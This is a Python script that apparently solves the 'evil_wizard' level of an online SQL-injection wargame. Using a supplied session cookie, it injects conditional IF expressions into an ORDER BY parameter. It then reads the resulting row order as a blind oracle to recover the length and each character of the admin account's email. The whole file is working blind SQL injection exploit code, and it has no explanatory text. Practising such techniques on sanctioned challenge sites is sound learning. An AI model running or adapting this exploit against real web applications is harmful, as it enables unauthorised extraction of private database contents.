import urllib.request
import sys

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?"
cookie = sys.argv[1]
pw = ''

for i in range(100):
  query = "order=if(id=%27admin%27%20and%20length(email)={},1,4)".format(i)
  req = urllib.request.Request(
    url+query,
    data=None,
    headers={
      "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "Cookie" : cookie
    })
  with urllib.request.urlopen(req) as res:
    body = res.read().decode()
  if '50</td></tr><tr><td>rubiya' in body:
    pw_len = i
    break
print(pw_len)

for i in range(1, pw_len+1):
  for j in range(0, 256):
    query = "order=if(id=%27admin%27%26%26ascii(substr(email,{},1))={},1,4)".format(i,j)
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if '50</td></tr><tr><td>rubiya' in body:
      pw += chr(j)
      break
print(pw)
